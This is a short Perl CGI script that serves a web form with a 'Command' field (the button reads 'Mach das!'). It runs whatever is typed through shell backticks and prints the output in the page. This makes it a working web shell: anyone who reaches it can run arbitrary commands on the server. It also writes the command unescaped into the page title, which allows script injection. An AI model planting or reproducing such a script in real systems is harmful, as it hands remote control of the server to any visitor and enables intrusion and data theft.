#!/usr/bin/perl -w
use CGI qw/:standard/;

if (!defined(param("command"))) {
	param("command", "echo hello");
}
my $command = param("command");
 
print 
	header, 
	start_html("your command: $command"),
	start_form(-action => script_name()),
	"Command: ", textfield("command"),
	submit("Mach das!"),
	end_form,
	"<PRE>",
	`$command`,
	"</PRE>",
	end_html;

